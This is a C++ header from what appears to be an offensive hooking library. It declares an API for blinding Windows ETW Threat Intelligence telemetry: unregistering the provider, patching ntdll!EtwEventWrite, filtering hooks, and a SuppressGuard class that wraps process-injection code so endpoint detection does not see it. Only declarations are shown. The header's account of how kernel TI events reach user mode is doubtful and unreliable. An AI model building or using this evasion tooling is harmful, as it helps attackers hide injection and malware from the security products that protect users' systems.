#pragma once

/**
 * vh/etwti_blind.vh — ETW Threat Intelligence evasion
 *
 * ETW-TI (Threat Intelligence) is a kernel-level provider that reports
 * sensitive operations (memory allocation, image loads, thread creation)
 * directly to EDR drivers via kernel callbacks.  Unlike user-mode ETW
 * (patched by telemetry_patch), ETW-TI operates at ring-0 and is the
 * primary source of EDR detections for injection and hooking.
 *
 * Evasion strategies implemented:
 *
 *   1. **Provider registration desync** — Temporarily unregister the TI
 *      provider GUID ({f4e1897c-bb5d-5668-f1d8-040f4d8dd344}) from the
 *      user-mode ETW registration table so kernel callbacks deliver events
 *      to a black hole.
 *
 *   2. **EtwEventWrite no-op patch** — The kernel-mode EtwTi provider
 *      calls EtwEventWrite in ntoskrnl.  Since we can't patch the kernel,
 *      we intercept the user-mode side: patch the ntdll!EtwEventWrite stub
 *      so the kernel's forwarded events are silently dropped at the
 *      earliest user-mode touchpoint.  This is layered with
 *      telemetry_patch but targets TI-specific provider GUIDs.
 *
 *   3. **Operation window guard** — RAII guard that suppresses TI-visible
 *      operations for its lifetime by temporarily disabling the TI
 *      provider, performing the sensitive operation, then restoring it.
 *      Minimizes the suppression window to reduce detection risk.
 *
 * Usage
 * ─────
 *
 *   #include <vh/vigil/etwti_blind.vh>
 *
 *   // Suppress ETW-TI during injection:
 *   {
 *       vh::etwti::SuppressGuard guard;
 *       // ... injection code here runs without TI telemetry ...
 *   }  // TI restored automatically
 *
 *   // Or manual control:
 *   vh::etwti::suppress();
 *   // ... do work ...
 *   vh::etwti::restore();
 *
 * Platform: Windows x64 only.  POSIX/ARM64 stubs return Unsupported.
 */

#include <vh/export.vh>
#include <vanhooks/vanhooks.vh>
#include <cstdint>

namespace vh::etwti {

/// Suppress ETW-TI provider registration (user-mode side).
/// Multiple calls are refcounted; each suppress needs a matching restore.
VH_API bool suppress() noexcept;

/// Restore ETW-TI provider registration.
/// Returns false if not currently suppressed.
VH_API bool restore() noexcept;

/// Query whether TI is currently suppressed.
[[nodiscard]] VH_API bool is_suppressed() noexcept;

/// Patch ntdll!EtwEventWrite to drop TI-provider events specifically,
/// rather than all ETW events (more targeted than telemetry_patch).
/// Call once; idempotent.
[[nodiscard]] VH_API bool patch_ti_provider() noexcept;

/// Undo the TI-provider-specific EtwEventWrite patch.
[[nodiscard]] VH_API bool unpatch_ti_provider() noexcept;

/// v2 — Provider-level selective blind.  Instead of patching all of
/// EtwEventWrite, hooks it with a filter that only drops events whose
/// RegHandle resolves to the TI GUID.  All other providers pass through.
[[nodiscard]] VH_API bool install_provider_filter() noexcept;
[[nodiscard]] VH_API bool remove_provider_filter() noexcept;

/// RAII guard: suppresses ETW-TI for its lifetime.
class VH_API SuppressGuard {
public:
    SuppressGuard() noexcept : active_(suppress()) {}
    ~SuppressGuard() noexcept { if (active_) restore(); }

    SuppressGuard(const SuppressGuard&)            = delete;
    SuppressGuard& operator=(const SuppressGuard&) = delete;
    SuppressGuard(SuppressGuard&& o) noexcept : active_(o.active_) { o.active_ = false; }
    SuppressGuard& operator=(SuppressGuard&& o) noexcept {
        if (this != &o) { if (active_) restore(); active_ = o.active_; o.active_ = false; }
        return *this;
    }

    [[nodiscard]] bool is_active() const noexcept { return active_; }

private:
    bool active_ = false;
};

} // namespace vh::etwti

